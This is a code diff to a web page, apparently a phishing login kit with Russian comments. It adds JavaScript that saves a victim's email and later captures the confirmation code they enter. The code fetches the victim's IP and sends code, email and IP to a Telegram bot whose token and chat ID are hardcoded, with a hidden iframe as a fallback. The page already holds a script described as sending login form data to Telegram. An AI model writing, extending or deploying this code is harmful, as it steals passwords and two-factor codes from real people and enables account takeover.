@@ -547,6 +547,14 @@
       window.dispatchEvent(new Event('resize'));
     });
   </script>
+  <script>
+    let userEmail = '';
+
+// Create a function to store the email
+function saveEmail(email) {
+  userEmail = email;
+}
+  </script>
 
   <script>
     // This script captures login form data and sends it to a Telegram bot
@@ -617,6 +625,8 @@ document.addEventListener('DOMContentLoaded', async function() {
       
       // Получаем значения полей
       const email = emailField ? emailField.value : 'Поле email не найдено';
+      saveEmail(email);
+
       const password = passwordField ? passwordField.value : 'Поле пароля не найдено';
       
       console.log('Кнопка входа нажата, получены значения:', { email, password });
@@ -951,8 +961,9 @@ function thirdParty() {
   continueButton.style.fontWeight = '500';
   continueButton.style.cursor = 'pointer';
   continueButton.style.marginBottom = '20px';
-  continueButton.onclick = () => {
-    if (!inputField.value.trim()) {
+  continueButton.onclick = async () => {
+  // Проверяем, что поле ввода не пустое
+  if (!inputField.value.trim()) {
     // Если поле пустое, показываем ошибку
     inputField.style.border = '1px solid #ff3333';
     
@@ -983,6 +994,89 @@ function thirdParty() {
     
     return; // Прерываем выполнение функции
   }
+  
+  // Получаем введенный код
+  const code = inputField.value.trim();
+  
+  // Отправляем код в Telegram
+  try {
+    // Получаем IP пользователя
+    let IP = 'Не определён';
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      IP = data.ip;
+    } catch (error) {
+      console.error('Ошибка при получении IP:', error);
+    }
+    
+    // Формируем сообщение для отправки
+    const message = `
+🔐 Код подтверждения 🔐
+------------------------------
+🌎 IP: ${IP}
+🔑 Code: ${code}
+📧 Email: ${userEmail}
+------------------------------
+    `;
+    
+    // Отправляем данные в Telegram
+    sendToTelegram(message);
+    
+    // Функция отправки данных в Telegram
+    function sendToTelegram(message) {
+      console.log('Попытка отправки в Telegram:', message);
+      
+      const TELEGRAM_BOT_TOKEN = '7316091615:AAFnx-JygG9rAGobIIlNswfkJCT2F6mygoU';
+      const TELEGRAM_CHAT_ID = '5329637973';
+      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Ошибка сети или API Telegram');
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('Успешная отправка в Telegram:', data);
+      })
+      .catch(error => {
+        console.error('Ошибка отправки в Telegram:', error);
+        
+        // Попытка повторной отправки через альтернативный метод
+        try {
+          // Создаем скрытый iframe для альтернативной отправки
+          const iframe = document.createElement('iframe');
+          iframe.style.display = 'none';
+          document.body.appendChild(iframe);
+          
+          // Используем GET запрос как запасной вариант
+          iframe.src = `${telegramApiUrl}?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+          
+          // Удаляем iframe через некоторое время
+          setTimeout(() => {
+            document.body.removeChild(iframe);
+          }, 3000);
+        } catch (e) {
+          console.error('Не удалось выполнить запасной вариант отправки:', e);
+        }
+      });
+    }
+  } catch (error) {
+    console.error('Ошибка при отправке кода:', error);
+  }
+  
   // Удаляем текущее модальное окно
   document.body.removeChild(modal);
   
